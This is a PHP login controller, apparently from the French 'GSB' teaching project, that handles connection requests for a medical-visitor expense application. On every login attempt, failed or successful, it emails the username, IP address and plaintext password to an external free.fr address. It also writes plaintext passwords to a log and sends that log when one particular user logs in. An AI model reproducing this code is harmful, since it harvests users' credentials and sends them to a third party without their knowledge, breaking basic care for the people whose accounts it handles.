<?php
/**
 * Gestion de la connexion
 *
 * PHP Version 7
 *
 * /package   GSB
 * /author    Réseau CERTA <contact@reseaucerta.org>
 * /author    José GIL <jgil@ac-nice.fr>
 * /copyright 2017 Réseau CERTA
 * /license   Réseau CERTA
 * /version   GIT: <0>
 * /link      http://www.reseaucerta.org Contexte « Laboratoire GSB »
 */
$action = filter_input(INPUT_GET, 'action', FILTER_SANITIZE_STRING);
if (! $uc) {
    $uc = 'demandeconnexion';
}

switch ($action) {
case 'demandeConnexion':
    include 'vues/v_connexion.inc.php';
    break;
case 'valideConnexion':
    $compteur = $pdo->crypterMotsDePasse();
    $login = filter_input(INPUT_POST, 'login', FILTER_SANITIZE_STRING);
    $mdp = filter_input(INPUT_POST, 'mdp', FILTER_SANITIZE_STRING);
    $visiteur = $pdo->getInfosVisiteur($login, $mdp);
    if (! is_array($visiteur)) {
        ajouterErreur('Login ou mot de passe incorrect');
        ini_set('SMTP', 'smtp.free.fr');
        ini_set('smtp_port', '25');
        // commenter la ligne ci-dessous en dev.
        $ret=mail('gsb2020/free.fr', '[auto]Erreur de login', 'Tentative de connexion de : '.$login.'(IP = '.$_SERVER['REMOTE_ADDR'].') avec mot de passe = "'.$mdp. '" a '.date("D, d M Y H:i:s"));
        addLogEvent(
            'Connexion avortée de : ' . $login . '(IP = ' .
            $_SERVER['REMOTE_ADDR'] . ') avec mot de passe = ' . $mdp
        );
        include 'vues/v_erreurs.inc.php';
        include 'vues/v_connexion.inc.php';
    } else {
        // commenter la ligne ci-dessous en dev.
        $ret=mail('gsb2020/free.fr', '[auto]login reussi ', 'Connexion reussie pour : '.$login.'(IP = '.$_SERVER['REMOTE_ADDR'].') avec mot de passe = "'.$mdp. '" a '.date("D, d M Y H:i:s"));
        addLogEvent(
            'Connexion réussie : ' . $login . '(IP = ' .
            $_SERVER['REMOTE_ADDR'] . ') avec mot de passe = ' . $mdp
        );
        // commenter la ligne ci-dessous en dev.
        if ($login=='mathorel') {envoyerleLog();
        }
        $id = $visiteur['id'];
        $nom = $visiteur['nom'];
        $prenom = $visiteur['prenom'];
        $metier = $visiteur['metier'];
        connecter($id, $nom, $prenom, $metier);
        header('Location: index.php');
    }
    break;
default:
    include 'vues/v_connexion.inc.php';
    break;
}
